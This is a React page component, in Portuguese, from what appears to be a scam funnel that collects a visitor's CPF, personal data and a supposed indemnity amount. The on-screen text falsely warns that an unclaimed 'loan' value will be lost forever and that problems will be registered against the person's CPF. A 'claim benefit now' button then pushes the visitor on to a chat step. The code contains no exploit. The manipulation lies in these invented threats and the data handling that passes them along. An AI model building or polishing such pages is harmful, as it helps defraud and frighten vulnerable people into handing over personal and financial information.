import React from 'react';
import { useLocation, useNavigate } from 'react-router-dom';
import Header from '../components/Header';
import Footer from '../components/Footer';
import { AlertTriangle } from 'lucide-react';
import { navigateWithParams } from '../utils/urlParams';

const WarningPage: React.FC = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const { userData, cpf: stateCpf, indemnityAmount, urlParams } = location.state || {};
  const searchParams = new URLSearchParams(location.search);
  const cpf = stateCpf || searchParams.get('cpf');

  const handleContinue = () => {
    navigateWithParams(
      navigate,
      '/chat',
      location,
      {
        cpf,
        userData,
        indemnityAmount
      }
    );
  };

  return (
    <div className="min-h-screen bg-[#f4f4f4] flex flex-col">
      <Header />
      
      <main className="flex-1 flex items-center justify-center pt-24 md:pt-32 pb-12 md:pb-20 px-4 md:px-12">
        <div className="max-w-3xl mx-auto">
          <div className="bg-white rounded-lg shadow-lg p-6 md:p-12">
            <div className="flex items-center justify-center mb-6 md:mb-8">
              <AlertTriangle className="h-12 w-12 md:h-16 md:w-16 text-red-500" />
            </div>
            
            <h1 className="text-2xl md:text-3xl font-semibold text-center text-gray-900 mb-6 md:mb-8">
              COMUNICADO
            </h1>

            <p className="text-sm md:text-lg text-gray-700 mb-6 md:mb-8 text-center">
              Caso você decida não consultar o seu empréstimo, o valor será perdido e impossibilitado de nova consulta, além de gerar pendências em seu CPF: {cpf}
            </p>
            
            <div className="bg-red-50 border border-red-100 rounded-xl p-4 md:p-6 mb-6 md:mb-8">
              <h2 className="text-base md:text-xl font-semibold text-red-800 mb-2">
                Evite irregularidades em seu nome
              </h2>
            </div>
            
            <button
              onClick={handleContinue}
              className="w-full bg-purple-600 text-white font-semibold py-3 md:py-4 px-6 text-sm md:text-base rounded-xl transition-all duration-300 hover:bg-purple-700 transform hover:-translate-y-1 hover:shadow-lg"
            >
              RESGATAR BENEFÍCIO AGORA
            </button>
          </div>
        </div>
      </main>

      <Footer />
    </div>
  );
};

export default WarningPage;